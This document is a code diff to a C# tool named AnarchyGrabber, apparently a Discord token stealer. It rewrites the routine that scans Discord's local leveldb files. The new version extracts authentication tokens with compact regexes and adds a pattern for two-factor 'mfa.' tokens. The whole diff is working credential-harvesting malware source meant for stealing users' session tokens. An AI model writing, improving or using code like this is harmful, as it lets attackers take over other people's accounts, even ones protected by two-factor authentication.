@@ -25,8 +25,14 @@ namespace AnarchyGrabber
             {
                 foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                 {
-                    //looks for discord token patterns (yes my regex is shit shut up)
-                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
+                    string contents = file.OpenText().ReadToEnd();
+
+                    //Get normal tokens
+                    foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                        tokens.Add(match.Value);
+
+                    //Get phone verified tokens
+                    foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                         tokens.Add(match.Value);
                 }
             }
